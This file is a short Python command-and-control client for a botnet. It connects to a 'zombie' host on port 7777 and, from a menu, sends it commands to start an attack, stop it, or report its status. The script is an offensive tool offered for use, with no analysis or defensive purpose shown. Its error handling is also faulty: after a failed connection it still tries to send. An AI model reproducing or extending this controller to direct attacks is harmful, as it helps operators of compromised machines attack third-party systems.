import socket

HOST = "192.168.1.5"  # The server's hostname or IP address
PORT = 7777        # The port used by the server

def command(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
        except:
            print("\nZombie is disconnected...")
        s.sendall(command.encode('utf-8'))
        data = s.recv(1024)
        print('\nReceived: ', repr(data))
        print('\n')

com = 'x'

while com != 'e':
	print('\n')
	print("#"*12+" Welcome to Controller "+"#"*12)
	print("\n")
	print("[A] To Attack the Target")
	print("[S] To Stop the Attack on Target")
	print("[C] To Check the Zombie is up ")
	print("[e] To Exit")
	print("\n")
	com = input("Choose your Action: ")
	if com == 'a' or com == 'A':
		command("Commence the Attack")

	elif com == 'c' or com == 'C':
		command("Check the Status")

	elif com == 's' or com == 'S':
		command("Stop the Attack")

print("Exiting the controller....")